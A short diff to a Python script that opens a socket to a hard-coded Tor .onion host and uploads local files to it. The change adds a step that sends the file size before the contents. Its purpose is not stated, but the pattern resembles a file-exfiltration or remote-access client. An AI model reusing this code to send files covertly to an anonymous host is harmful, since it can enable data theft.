@@ -1,4 +1,4 @@
-import socket, ssl, pprint, socks
+import socket, ssl, pprint, socks, sys, os
 
 host = '3pnzzdpq7aj6s6b6.onion'
 
@@ -12,6 +12,7 @@ def SendData(inText):
 
 def UploadFILE(fileName):
     fileUP = open(fileName, 'rb')
+    SendData(str(os.path.getsize(fileName)))
     while 1:
         tempData = fileUP.read()
         if tempData == '':
